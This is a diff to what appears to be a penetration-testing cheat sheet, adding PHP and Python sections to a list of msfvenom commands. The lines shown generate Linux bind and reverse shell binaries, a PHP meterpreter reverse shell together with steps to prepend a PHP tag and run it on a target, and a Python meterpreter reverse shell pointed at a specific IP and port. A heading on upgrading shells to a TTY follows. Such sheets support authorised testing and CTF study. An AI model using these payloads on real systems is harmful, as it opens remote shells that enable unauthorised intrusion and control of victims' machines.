@@ -106,7 +106,15 @@ AWK
     msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
     msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
-    
+   
+PHP   
+
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php   
+    target $ php shell.php    
+Python    
+
+    msfvenom -p python/meterpreter/reverse_tcp RHOST=10.10.16.192 LPORT=4444 -f raw > shell.py    
 ## Upgrading to a pseudo terminal / TTY     
 [Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  
 [What Happens in a Shell Upgrade?](What Happens In a "Shell Upgrade"?)   
